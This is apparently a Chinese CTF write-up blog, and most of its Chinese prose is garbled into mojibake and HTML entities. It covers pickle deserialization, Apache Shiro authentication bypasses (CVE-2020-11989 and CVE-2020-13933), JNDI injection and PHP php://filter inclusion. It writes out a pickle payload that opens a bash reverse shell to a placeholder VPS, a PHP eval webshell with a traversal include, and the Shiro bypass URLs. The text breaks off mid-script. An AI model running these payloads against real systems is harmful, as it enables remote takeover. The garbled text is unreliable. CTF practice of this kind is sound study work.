b\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;bash -c \\\\\\\u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/you_vps_ip/port \u0026lt;\u0026amp;1\\\\\\\u0026#39;\u0026#34;)\\\u0026#39;\\np3\\n0g2\\n(g3\\ntR.\u0026#39; ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ç”±äºè¿™é‡Œçš„ååºåˆ—åŒ–å…¥å£æ˜¯getä¼ å‚ï¼Œæ‰€ä»¥é‡åˆ°+å·ä¼šå‡ºé—®é¢˜ï¼Œä¼ è¿›å»ä¹‹å‰è¦å…ˆurlencode(encode all special chars)\nâ€”â€”â€”â€”é¡ºå¸¦ç»ƒä¸ªæ‰‹ï¼Œæ“ä¸€ä¸ªä¸å«b'R'çš„opcodeï¼ˆç”¨b'o'ä»£æ›¿ï¼‰\ndata = b\u0026#39;\u0026#39;\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;bash -c \\\\\\\u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/you_vps_ip/port \u0026lt;\u0026amp;1\\\\\\\u0026#39;\u0026#34;)\\\u0026#39;\\np3\\n0(g2\\ng3\\no.\u0026#39;\u0026#39;\u0026#39; ä¼ å‚çš„æ—¶å€™è®°å¾—å†urlencodeä¸€ä¸‹~~~\nâ€”â€”â€”â€”ä¹‹å‰æˆ‘çš„æ€»ç»“ç¬”è®°å·²ç»ç›¸å½“å…¨é¢äº† å¯ä»¥å‡ºCTFæ•™ç§‘ä¹¦äº†233333\nJack-Shiro å±äºæ˜¯åŸé¢˜äº†å±äºæ˜¯å±äºæ˜¯å±äºæ˜¯çƒ¤çƒ‚äº†å·²ç»ï¼Œå‚è§ [çº¢æ˜è°·CTF 2021] JavaWeb | [å¤©ç¿¼æ¯ 2021] jackson | [NPUCTF2020] EzShiroï¼ˆè™½ç„¶æˆ‘è‡ªå·±æ ¹æœ¬æ²¡å‘ç° å®åœ¨æ˜¯åšè¿‡çš„é¢˜å¤ªå°‘äº† javaæ›´æ˜¯ä¸ä¼š æˆ‘çš„\n/loginä¸‹æœ‰ä¸ªç™»å½•ï¼Œå›æ˜¾/jsonï¼Œè¿”å›çš„cookieæœ‰ä¸ªrememberMe=deleteMeï¼Œå¯ä»¥çŸ¥é“æ˜¯shiro\nè®¿é—®/jsonï¼Œåé¢ä¼šå¸¦ä¸€å †getè¯·æ±‚çš„å‚æ•°ï¼Œç”¨/;/jsonç»•è¿‡ï¼ˆcve-2020-11989ï¼‰\nä¸Šå·¥å…·JNDI-Injection-Exploitä¸€æŠŠæ¢­ï¼ˆé—®é¢˜å‡ºåœ¨æˆ‘vpsä¸Šæ²¡æœ‰javaç¯å¢ƒ ç«¯å£è½¬å‘åˆå¤„äº†äº¿ç‚¹ç‚¹é—®é¢˜â€¦â€¦ æ‰€ä»¥æ²¡æœ‰å¸¦å‡ºæ¥flagï¼‰ï¼Œæ˜¯cve-2020-36188\nå“­å“­\nè¿˜æœ‰ä¸ªå·¥å…·æ˜¯ LdapBypassJndiï¼Œå·®ä¸å¤šçš„ï¼›ä¸‹é¢æ˜¯è·Ÿä¸€è·Ÿæ¶‰åŠåˆ°çš„å‡ ä¸ªé“¾å­\nCVE-2020-11989 å‚è€ƒï¼šApache Shiroæƒé™ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-11989) | Apache Shiro èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ (CVE-2020-11989)\nApache Shiroæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„javaå®‰å…¨æ¡†æ¶ï¼Œåœ¨1.5.3ä¹‹å‰ç‰ˆæœ¬ä¸­å½“Shiroä¸SpringåŠ¨æ€æ§åˆ¶å™¨ä¸€èµ·ä½¿ç”¨æ—¶ï¼ˆSpringæ¡†æ¶ä¸­åªç”¨Shiroé‰´æƒï¼‰ï¼Œå¦‚æœç›´æ¥è®¿é—®/shiro/admin/pageä¼š302è·³è½¬è¦æ±‚ç™»å½•ï¼Œè€Œè®¿é—®/;shiro/admin/pageå³å¯ç»•è¿‡æƒé™éªŒè¯ï¼Œè®¿é—®/adminçš„ä¿¡æ¯\næœ¬åœ°ç¯å¢ƒæ­å»º\u0026amp;å¤ç° æœ‰å¸¦ä½¬ç›´æ¥å†™å¥½çš„dockerå¯ä»¥ç›´æ¥pullæ‹¿æ¥ç”¨\ndocker pull jackey0/cve-2020-11989 docker run -p 8426:8080 \u0026lt;image\u0026gt; /bin/sh -c 'java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar' docker pull jackey0/cve-2020-13933 // docker start \u0026lt;container-id\u0026gt; æˆ–è€…ä¸‹è½½l3yx/springboot-shiroé¡¹ç›®åˆ°æœ¬åœ°ç¼–è¯‘ä¸ºwaråŒ…ï¼ˆæˆ–è€…ä¹Ÿæœ‰ç¼–è¯‘å¥½çš„shiro.warï¼‰ä¹‹åæ‰‹åŠ¨æ”¾å…¥tomcatä¸‹çš„webappsç›®å½•ä¸‹è¿è¡Œã€‚æ˜¾ç„¶dockerå¤ªé¦™äº†ï¼ï¼ï¼ï¼ï¼\nè®¿é—®æ˜ å°„åˆ°å¤–éƒ¨çš„8426ç«¯å£ï¼Œç¯å¢ƒæ­å»ºå®Œæ¯•\npostæ–¹å¼è¯·æ±‚/doLoginé¡µé¢ï¼Œçœ‹åˆ°cookieä¸­å«rememberMe=deleteMeï¼Œç¡®å®šä¸ºshiro\nè®¿é—®/admin/pageé¡µé¢ï¼Œ302é‡å®šå‘è‡³/loginé¡µé¢è¦æ±‚ç™»å½•\nè®¿é—®/;/admin/pageé¡µé¢ï¼Œç»•è¿‡é‰´æƒï¼Œå›æ˜¾admin page\næºç åˆ†æ\u0026amp;åŠ¨è°ƒ å…ˆæŠŠjaråŒ…ä¸‹è½½åˆ°åœ¨æœ¬åœ°ï¼Œå¯¼å…¥idea\ndocker cp \u0026lt;container-id\u0026gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/ ä½¿ç”¨ideaè¿œç¨‹å¯¹dockerä¸­éƒ¨ç½²çš„springbooté¡¹ç›®è¿›è¡Œdebug\ndocker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar' Shiroçš„æƒé™æ ¡éªŒæ˜¯é€šè¿‡åˆ¤æ–­urlçš„åŒ¹é…æ¥è¿›è¡Œçš„ï¼Œå¦‚æœShiroè·å–çš„urlå’Œwebæ¡†æ¶å¤„ç†çš„urlç»“æœä¸ä¸€è‡´æ—¶å°±é€ æˆäº†æƒé™ç»•è¿‡ï¼›Shiroå¯¹äºurlçš„è·å–å’ŒåŒ¹é…åœ¨org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChainä¸­è¿›è¡Œã€‚\nä»¥è®¿é—®/;/admin/pageä¸ºä¾‹ï¼Œé€šè¿‡å®ƒçš„getPathWithinApplication()å¾—åˆ°çš„requestURI=\u0026quot;/\u0026quot;\nè·Ÿå…¥æ­¤å‡½æ•°çš„å¤„ç†é€»è¾‘org.apache.shiro.web.util.WebUtils#getPathWithinApplicationï¼Œè¿›å…¥getRequestUri()\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ä¸­é—´è¿‡ç¨‹ä¸­uri=\u0026quot;/;/admin/page\u0026quot;ï¼Œä½†æ˜¯ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ç»è¿‡normalize(decodeCleanUriString())å¤„ç†è¿‡åè¿”å›çš„requestRUI=\u0026quot;/\u0026quot;ï¼Œè·Ÿå…¥è¿™ä¸ªå‡½æ•°ï¼Œå®ƒå…ˆæ˜¯è°ƒç”¨decodeRequestSrting()ï¼Œæ²¡æœ‰å¯¹ç»“æœäº§ç”Ÿä»€ä¹ˆå½±å“ï¼Œ\nè€Œè¿”å›æ—¶çš„normalize()ä¼šæ ¹æ®\u0026quot;;\u0026ldquo;è¿›è¡Œurlçš„æˆªæ–­å¤„ç†ï¼Œæœ€ç»ˆè¿”å›\u0026rdquo;/\u0026quot;\nå›åˆ°å¼€å¤´çš„/;/admin/pageè¯·æ±‚ï¼Œspringä¸­å¤„ç†urlçš„å‡½æ•°åœ¨org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping\nå®ƒè°ƒç”¨çš„æ˜¯springframeworkä¸­è‡ªå·±getPathWithinApplication()ï¼Œç»è¿‡ä¸€ç•ªéªšæ“ä½œè¿”å›çš„æ˜¯/admin/page\nè·Ÿå…¥getPathWitinApplication()ï¼Œå…ˆæ˜¯è°ƒç”¨getContextPath()ï¼Œè¿”å›\u0026quot;/\u0026quot;\nç„¶åæ˜¯getRequestUri()\nåŒæ ·ï¼Œåœ¨æœ€ç»ˆreturnä¹‹å‰çš„uri=\u0026quot;/;/admin/page\u0026quot;ï¼Œç»è¿‡äº†ä¸€ä¸ªdecodeAndCleanUriString()ï¼Œæ ¹æ®ch=59ä¹Ÿå°±æ˜¯\u0026quot;;\u0026ldquo;ç¬¦è¿›è¡Œä¸€ä¸ªåˆ†å‰²ï¼Œä½¿ç”¨removeSemicolonContentInternal()\näºæ˜¯\u0026rdquo;;\u0026ldquo;å°±ä¸è§äº†\nç„¶åè¿”å›\u0026rdquo;/admin/page\u0026quot;ç»™getPathWithinApplication()\nå†ä¼ é€’ç»™getPathWithinServletMapping()\næœ€ç»ˆæˆ‘ä»¬è®¿é—®åˆ°çš„é¡µé¢å°±æ˜¯\u0026quot;/admin/page\u0026quot;äº†\nâ€”â€”â€”â€”æ€»ç»“ä¸€ä¸‹å°±æ˜¯å½“urlåœ¨shiroå’Œspringä¸­çš„å¤„ç†ä¸ä¸€è‡´ï¼Œå½“è¿›å…¥åº”ç”¨æ—¶è¢«è®¤ä½œæ˜¯è®¿é—®\u0026quot;/;/admin/page\u0026quot;ï¼Œä¸å±äºæˆ‘ä»¬æœ€åˆé…ç½®çš„\u0026quot;/admin/*\u0026ldquo;æƒé™è·¯ç”±ï¼Œè€Œè¿›å…¥shiroåå´è¢«æˆªæ–­å¤„ç†ï¼Œè®¤ä½œæ˜¯\u0026rdquo;/admin/page\u0026quot;ï¼Œå±äºæƒé™è·¯ç”±ä¸­ï¼Œæœ€ç»ˆåšåˆ°æƒé™ç»•è¿‡\nCVE-2020-13933 ç”±äº11989çš„ä¿®è¡¥å¹¶ä¸å®Œå…¨ï¼Œå¯¼è‡´åˆåˆåˆè¢«ç»•è¿‡äº§ç”Ÿäº†13933â€¦â€¦\næœ¬åœ°ç¯å¢ƒæ­å»º\u0026amp;å¤ç° å‚è€ƒï¼šshiro \u0026lt; 1.6.0çš„è®¤è¯ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-13933)\nè¿˜æ˜¯é‡‡ç”¨dockerå½¢å¼å¤ç°ï¼ˆæˆ‘çˆ±dockerï¼‰è¿™é‡Œç›´æ¥å°±æ˜¯è¿œç¨‹è°ƒè¯•çš„å¯åŠ¨å‘½ä»¤å•¦ï¼Œè·Ÿä¸Šé¢çš„ä¸€æ ·é…ç½®å°±å¥½äº†ï¼ˆ\ndocker pull jackey0/cve-2020-13933 docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar' è®¿é—®/adminï¼ŒæŠ¥é”™é¡µé¢ä¸”æ— 302è·³è½¬ï¼›è®¿é—®/loginè·³è½¬åˆ°èº«ä»½éªŒè¯é¡µé¢ï¼›è®¿é—®/admin/%3bpageï¼Œæ— èº«ä»½éªŒè¯ä¸”è¿”å›admin page\nåŸç†åˆ†æ\u0026amp;åŠ¨è°ƒ è¿˜æ˜¯å¯¼å…¥jaråŒ…è‡³ideaï¼Œè¿œç¨‹debug\nç›´æ¥çœ‹çœ‹shiro1.6.0çš„è¡¥ä¸è¡¥åˆ°äº†ä»€ä¹ˆåœ°æ–¹ï¼Œåœ¨githubä¸ŠæŸ¥çœ‹diff\nå¢åŠ äº†InvalidRequestFilterç±»ï¼Œæœ‰ä¸ªisAccessAllowed()å‡½æ•°ï¼Œåœ¨å…¨å±€ä¸Šå¯¹åˆ†å·ã€åæ–œæ ã€éASCIIç å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤\nä»¥è®¿é—®/admin/%3bpageä¸ºä¾‹ï¼Œurlå…ˆç”±shiroè§£æï¼Œè¿˜æ˜¯org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChainï¼Œä¾æ—§æ˜¯è°ƒç”¨getPathWithinApplication()ï¼Œæ‰§è¡ŒårequestURI=\u0026quot;/admin/\u0026quot;\nè€Œä¹‹åè¿›å…¥springbootå¤„ç†æ—¶ï¼Œå´å˜æˆäº†\u0026quot;/admin/;page\u0026quot;\nå†å›åˆ°æœ€åˆè·Ÿä¸€ä¸‹å…·ä½“çš„è°ƒç”¨é“¾\nåœ¨removeSemicolon()å¤„ç†å‰ï¼Œuri=\u0026quot;/admin/;page\u0026quot;ï¼ˆç»decodeAndUriString()è§£ç äº†ï¼‰\nå¤„ç†åpath=\u0026quot;/admin\u0026quot;ï¼Œæ¥ç€è°ƒç”¨normalize()å‡½æ•°å˜æˆ\u0026quot;/admin\u0026quot;ï¼Œä¼ é€’ç»™æœ€åˆçš„getChain()ä¸­çš„requestURIå‚æ•°\nä¹‹åè¢«springå¤„ç†org.springframework.web.util.UrlPathHelper#getPathWithinServletMappingï¼Œå…¶ä¸­ä¼šè°ƒç”¨getRequestUri()ï¼Œå®ƒä¼šå†æ¬¡è°ƒç”¨decodeAndCleanUriString()\nå…ˆremoveSemicolonContent()å†decodeRequestString()ï¼Œé‚£æ˜¾ç„¶æ˜¯æ€ä¹ˆéƒ½å»ä¸æ‰\u0026quot;;\u0026ldquo;äº†ï¼Œå°†\u0026rdquo;;page\u0026quot;çœ‹ä½œä¸€ä¸ªæ•´ä½“\næˆ‘ä»¬å›è¿‡å¤´å»çœ‹è¿™æ¬¡çš„æƒé™è®¾ç½®æ˜¯æ€ä¹ˆåŒ¹é…urlçš„ï¼Œå®šä½åˆ°org.syclover.srpingbootshiro.LoginControllerå’Œorg.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean\nå¯ä»¥çœ‹åˆ°ï¼Œå¯¹äº\u0026quot;/admin/*\u0026ldquo;éœ€è¦é‰´æƒï¼Œ\u0026quot;/admin/{name}\u0026ldquo;è¿”å›admin pageï¼Œè€Œå¯¹äº\u0026rdquo;/admin/\u0026ldquo;å´æ²¡æœ‰è®¾ç½®æƒé™\nä»ä¸Šé¢çš„è°ƒè¯•ä¸­æˆ‘ä»¬çŸ¥é“shiroå¾—åˆ°çš„æ˜¯\u0026rdquo;/admin/\u0026quot;ï¼ˆå…ˆdecodeå†å»é™¤\u0026rdquo;;\u0026quot;ï¼‰ï¼Œè¢«è®¤ä½œå¯ä»¥è®¿é—®ï¼›è€Œspringå¾—åˆ°çš„æ˜¯\u0026quot;/admin/;page\u0026quot;ï¼‰å…ˆå»é™¤\u0026quot;;\u0026ldquo;å†decodeï¼‰ï¼Œä¸\u0026rdquo;/admin/{name}\u0026ldquo;çš„æ ·å¼åŒ¹é…ï¼Œæœ€åè¿”å›admin page~~ï¼ˆç®€ç›´å¤ªå®Œç¾äº†ä¹Ÿ~~\n*ä¸´æ—¶ä¿®å¤ ï¼ˆæœ¬åœ°æš‚æ—¶è¿˜æœªå¤ç°\nmap.put(\u0026quot;/admin/**\u0026quot;, \u0026quot;authc\u0026quot;); @GetMapping({\u0026quot;/admin/page\u0026quot;}) public String admin() { return \u0026quot;admin page\u0026quot;; } ***CVE-2020-36188 ch.qos.logback.core.db.JNDIConnectionSource\nå¯ä»¥å‚è€ƒ https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiroï¼Œå·¥å…· LdapBypassJndi | JNDI-Injection-Exploit\nâ€”â€”â€”â€”ç”±äºæˆ‘çš„javaæ°´å¹³å®åœ¨å¤Ÿå‘›ï¼Œè¿™é‡Œæš‚æ—¶å…ˆç©ºç€ï¼Œç­‰æˆ‘å­¦ä¸€å­¦java ä¹‹åå¿…å®šå›æ¥é­å°¸\nEasyFilter \u0026lt;?php ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;./\u0026#34;); if(!isset($_GET[\u0026#39;action\u0026#39;])){ highlight_file(__FILE__); die(); } if($_GET[\u0026#39;action\u0026#39;] == \u0026#39;w\u0026#39;){ @mkdir(\u0026#34;./files/\u0026#34;); $content = $_GET[\u0026#39;c\u0026#39;]; $file = bin2hex(random_bytes(5)); file_put_contents(\u0026#34;./files/\u0026#34;.$file,base64_encode($content)); echo \u0026#34;./files/\u0026#34;.$file; }elseif($_GET[\u0026#39;action\u0026#39;] == \u0026#39;r\u0026#39;){ $r = $_GET[\u0026#39;r\u0026#39;]; $file = \u0026#34;./files/\u0026#34;.$r; include(\u0026#34;php://filter/resource=$file\u0026#34;); } /?action=w\u0026amp;c=\u0026lt;?php @eval($_POST['wuhu']);?\u0026gt; /?action=r\u0026amp;r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9 POST: wuhu=phpinfo(); å¯¹äºpayloadçš„åº•å±‚ä»£ç åˆ†æ åŸç†åˆ†ææ¥è‡ªGuokeä½¬ æˆ‘åªæ˜¯ä¸ªä¼šå¤ç°çš„é“æ²¸ç‰©â€¦â€¦\né¦–å…ˆä¸‹ä¸€ä»½7.2.34çš„æºç \nå®šä½åˆ°åŒ…è£…å™¨æ‰€åœ¨çš„æ–‡ä»¶ä½ç½®/ext/standard/php_fopen_wrapper.cï¼Œ178è¡Œèµ·æ˜¯php_stream_url_wrap_php()çš„ä»£ç \n191è¡Œï¼Œå…ˆç¢°åˆ°php://ä¼šæ‰§è¡Œpath += 6ï¼›ä¹‹åæ¥ç€349è¡Œä¼šç¢°åˆ°filter/\næ²¡æœ‰modeï¼Œæ­¤æ—¶\npath=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 357è¡Œæ‰§è¡Œstrdup()ï¼ŒæŠŠpathç¬¬6ä½ä¹‹åçš„å†…å®¹èµ‹ç»™pathdupæŒ‡é’ˆä¸Š\npathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 358è¡Œstrstr()è¿”å›pathdupçš„æŒ‡é’ˆä¸­/resource=å‡ºç°çš„ä½ç½®ï¼Œåˆ°365è¡Œçš„åˆ¤æ–­\np+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 372è¡Œçš„php_strtok_r()å¯¹pathdup+1çš„ä½ç½®ä»¥'/\u0026lsquo;ä¸ºæ ‡å¿—è¿›è¡Œåˆ†å‰²\np=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt å¾—åˆ°resource=ï¼Œè¿›373è¡Œçš„whileå¾ªç¯ï¼Œå…ˆæ˜¯åˆ°378è¡Œçš„php_stream_apply_filter_list()ï¼Œè½¬è‡³159è¡Œ\nå°†pä½œä¸ºè¿‡æ»¤å™¨è¿›è¡Œæ³¨å†Œï¼Œ161è¡Œphp_stream_filter_append()åº”ç”¨åˆ°æ–‡ä»¶æµä¸Šï¼Œä½†æ˜¾ç„¶resourceä¸æ˜¯æµåŒ…è£…å™¨ï¼Œå¹²ä¸äº†äº‹ï¼Œé‚£å°±å†åˆ°whileå¾ªç¯é‡Œæ¥ç€å‘åæ‰¾ï¼Œç›´åˆ°å‘åç¢°åˆ°read\np=/read=convert.base64-decode/resource=/../../../../../1.txt è¿›å…¥374è¡Œï¼Œæ‰§è¡Œphp_stream_apply_filter_listä¹‹åå°±å˜æˆäº†\np=convert.base64-decode/resource=/../../../../../1.txt æ­¤æ—¶çš„p=convert.base64-decodeï¼Œå°±å¯ä»¥æ­£å¸¸çš„b64è§£ç æˆ‘ä»¬çš„å†…å®¹äº†\nå†å›å¤´çœ‹è¿™ä¸ªé¢˜ ä»£ç å¾ˆçŸ­ï¼Œé™åˆ¶åœ¨äºå†™å…¥çš„æ–‡ä»¶å†…å®¹è¢«b64åŠ å¯†\u0026amp;open_basedir\u0026amp;includeå·²ç»å†™å¥½çš„åŒ…è£…å™¨å’Œä¸€éƒ¨åˆ†å›ºå®šçš„å†…å®¹\næˆ‘åˆšå¼€å§‹å¡åœ¨äº†å·²ç»å†™æ­»çš„åŒ…è£…å™¨çš„å¼€å¤´è¿˜æ€ä¹ˆåŠ conver.base64-decodeï¼Ÿç„¶åå‘ç°æ˜¯æˆ‘æƒ³å¤šäº†ï¼Œå¯ä»¥æ¥ç€å¥—ï¼Œåº•å±‚åŸç†è§ä¸Šï¼Œä¼šå‘åå¾ªç¯å–å€¼ç›´åˆ°ç¢°åˆ°ä¸€ä¸ªæ­£å¸¸çš„æµåŒ…è£…å™¨\nç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯ç›®å½•ç©¿è¶Šäº†ï¼Œå‰é¢åŠ äº†5å±‚buffï¼Œä»ç»“æœå€’æ¨æ„Ÿè§‰å¯ä»¥ç†è§£ï¼Œä½†æ˜¯è‡ªå·±å´æ²¡è¯•å‡ºæ¥ï¼Œæˆ‘çš„é—®é¢˜\næœ€åopen_basedirçš„ç»•è¿‡åè€Œæ˜¯æœ€è½»æ¾çš„ï¼Œèšå‰‘æ’ä»¶ç›´æ¥æ\nå‚è€ƒï¼šæ·±å…¥ç†è§£PHPä¹‹require/includeé¡ºåº | Exploit with PHP Protocols / Wrappers | è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨\nnew_hospital å“åº”cookieä¼šæœ‰ä¸ªAPI\nå°†APIè®¾ä¸ºflag.php ZmxhZy5waHA%3d\næ‰«ç›®å½• å¾—åˆ°/old/feature.php å°†è·¯å¾„æ”¹ä¸ºè¿™ä¸ª\nå°†APIæ”¹ä¸º../flag.php Li4vZmxhZy5waHA%3d\nâ€”â€”â€”â€”å…¶å®å¦‚æœå…ˆæ‰«ç›®å½•æ‰«åˆ°/old/feature.phpçš„è¯ï¼Œå¯ä»¥å°†APIè®¾ä¸º./feature.php Li9mZWF0dXJlLnBocA%3d%3d è¯»åˆ°è¿™ä¸€æ®µ\nåç«¯çš„é€»è¾‘å°±æ˜¯å°†cookie[\u0026lsquo;api\u0026rsquo;]å–å‡ºï¼Œç›´æ¥è¯»å‡ºå†…å®¹\næœ‰ä¸€ç‚¹ç‚¹è„‘æ´ï¼Œä¹Ÿè·Ÿçœ¼åŠ›è§æœ‰å…³ç³»ï¼Œæˆ‘ä¸€å¼€å§‹æ˜¯çœŸæ²¡æ³¨æ„åˆ°è¿™ä¸ªcookieçš„APIå­—æ®µï¼Œå±å®æ˜¯æœ‰ç‚¹å¤§ç—…ï¼›ä¹‹ååšé¢˜è¿˜æ˜¯è¦å¼€ç¯å¢ƒä¹‹åå°±è¿burpï¼Œæ³¨æ„è§‚å¯Ÿå“åº”å¤´çš„ç‰¹æ®Šå­—æ®µ cookieçš„ç±»å‹/ctrl+uçš„æºç /å¯èƒ½ä¼šæœ‰çš„æ§åˆ¶å°çš„æç¤ºä¿¡æ¯/robots.txtè¿™äº›ä¸œè¥¿ï¼Œä¸è¦é—æ¼ï¼Œä¸ç„¶å°±å¾ˆå¯æƒœäº†\nGive_me_you_0day è¿™é‡Œè€ƒå¯Ÿçš„ç‚¹å¹¶ä¸æ˜¯Typecho 1.1/17.10.30ç‰ˆæœ¬çš„0dayï¼ˆç»™å‡ºçš„æºç å°±å®Œå…¨æ˜¯githubä¸Šçš„å‘è¡Œç‰ˆï¼‰ï¼Œè€Œæ˜¯install.phpä¸­ 608è¡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«\nåˆ©ç”¨è¿™ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹æ¥æï¼Œpayloadå¯ä»¥ç›´æ¥å‚è€ƒ[RCTF 2021] VerySafe\næ‰“çš„ç‚¹åœ¨äºpeclcmdï¼Œè¿™é‡Œæ¶‰åŠåˆ°çš„é¢˜å’ŒçŸ¥è¯†å®³æŒºå¤šï¼Œä¹‹å‰çœŸæ²¡è§è¿‡ï¼ˆdbqæ˜¯æˆ‘åšçš„é¢˜å¤ªå°‘å¤ªå°‘äº†ï¼‰ï¼Œåœ¨è¿™é‡Œä¸€å¹¶å­¦ä¹ äº†\nå…³äºregister_argc_argvé…ç½®é¡¹ æ˜¯php.iniæ ¸å¿ƒé…ç½®ä¸­çš„ä¸€ä¸ªé€‰é¡¹ï¼Œé»˜è®¤æ˜¯è¿™æ ·æ‰‹å†Œæ˜¯è¿™æ ·å†™çš„\nä»php=4.0.0åä¸ºå¯è®¾ç½®çš„é€‰é¡¹ï¼ˆæ­¤å‰æ€»ä¸ºOnï¼‰é»˜è®¤ä¸ºå¼€å¯çŠ¶æ€ï¼Œå½“php\u0026lt;=4.2.3æ—¶å¯ä¿®æ”¹èŒƒå›´æ˜¯PHP_INI_ALLï¼Œæ›´è¯¦ç»†çš„å†…å®¹å¯ä»¥å‚è§-\u0026gt;PHPçš„å‘½ä»¤è¡Œæ¨¡å¼\nåœ¨register_argc_argvå¼€å¯çš„æƒ…å†µä¸‹ï¼Œcgiå’Œcliæ¨¡å¼ä¸‹éƒ½å¯ä»¥ç›´æ¥è®¿é—®åˆ°ä¼ å…¥çš„å‚æ•°ï¼›å…¶ä¸­argcæ˜¯ä¼ é€’è¿‡å»çš„å‚æ•°çš„ä¸ªæ•°ï¼Œargvæ˜¯åŒ…å«æœ‰å®é™…å‚æ•°çš„æ•°ç»„ï¼›cliæ¨¡å¼æµ‹è¯•å¦‚ä¸‹\n\u0026lt;?php var_dump($_SERVER[\u0026#39;argv\u0026#39;]); // var_dump($HTTP_SERVER_VARS[\u0026#39;argv\u0026#39;]); var_dump($argv); cgiçš„è¯ï¼Œç›´æ¥ç”¨ä¸Šé¢çš„$_SERVER['argv']æ˜¯ä¸ä¼šè·å–åˆ°å€¼\nç›´æ¥æŸ¥çœ‹$_SERVERè¿™ä¸ªå¤§æ•°ç»„ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬çš„å‚æ•°åœ¨è¿™é‡Œæ˜¯ä»¥ä¸€æ•´ä¸ªQUERY_STRINGçš„å½¢å¼å‡ºç°çš„ï¼ˆè¯¦ç»†çš„æ•°ç»„è§£æ-\u0026gt;PHPè¶…å…¨å±€å˜é‡$_SERVERçš„ç”¨æ³•ï¼‰\næœ‰ä¸ªç‰¹æ®Šçš„trickåœ¨äºï¼Œå¦‚æœæ˜¯\n/test.php?a=1\u0026amp;b=1 ç¡®å®æ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä½†è¿”å›çš„$_SERVER[\u0026lsquo;argv\u0026rsquo;]ä¸º1ï¼Œå¦‚æœæ˜¯\n/test.php?a=1+b=1 åˆ™ä¼šè¢«æˆªæ–­ï¼Œè¿”å›$_SERVER[\u0026lsquo;argv\u0026rsquo;]åˆ™ä¸º2ï¼ˆè¯´å®è¯æˆ‘æœ¬åœ°çœŸæ²¡è·‘å‡ºæ¥è¿™ä¸ª å¯èƒ½æ˜¯å“ªé‡Œçš„é…ç½®æœ‰é—®é¢˜ï¼Ÿä½†æ˜¯çœ‹äº†å¾ˆå¤šèµ„æ–™ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯ä»¥è¢«å¤ç°æˆåŠŸçš„â€¦â€¦â€¦â€¦â€¦â€¦emmmm æœ‰ä¸€ç‚¹ç‚¹ç¦»è°±ï¼‰\nå…³äºpearå‘½ä»¤ pearæ˜¯the PHP Extention and Application Repositoryçš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªPHPæ‰©å±•ä¸åº”ç”¨çš„ä»£ç ä»“åº“ï¼Œpearä»“åº“ä»£ç ä»¥åŒ…packageåˆ†åŒºï¼Œæ¯ä¸€ä¸ªpear packageéƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®ï¼Œæœ‰è‡ªå·±ç‹¬ç«‹çš„å¼€å‘å›¢é˜Ÿã€ç‰ˆæœ¬æ§åˆ¶ã€æ–‡æ¡£å’Œå…¶ä»–åŒ…çš„ä¾èµ–å…³ç³»ä¿¡æ¯ï¼›pear packageä»¥phar, tar, zipå½¢å¼å‘å¸ƒï¼Œé€šè¿‡apt install php-pearæ¥å®‰è£…\npearå‘½ä»¤çš„å®ç°æ˜¯ä¸€ä¸ªshè„šæœ¬\n#!/bin/sh  # first find which PHP binary to use if test \u0026#34;x$PHP_PEAR_PHP_BIN\u0026#34; != \u0026#34;x\u0026#34;; then PHP=\u0026#34;$PHP_PEAR_PHP_BIN\u0026#34; else if test \u0026#34;/usr/local/bin/php\u0026#34; = \u0026#39;@\u0026#39;php_bin\u0026#39;@\u0026#39;; then PHP=php else PHP=\u0026#34;/usr/local/bin/php\u0026#34; fi fi # then look for the right pear include dir if test \u0026#34;x$PHP_PEAR_INSTALL_DIR\u0026#34; != \u0026#34;x\u0026#34;; then INCDIR=$PHP_PEAR_INSTALL_DIR INCARG=\u0026#34;-d include_path=$PHP_PEAR_INSTALL_DIR\u0026#34; else if test 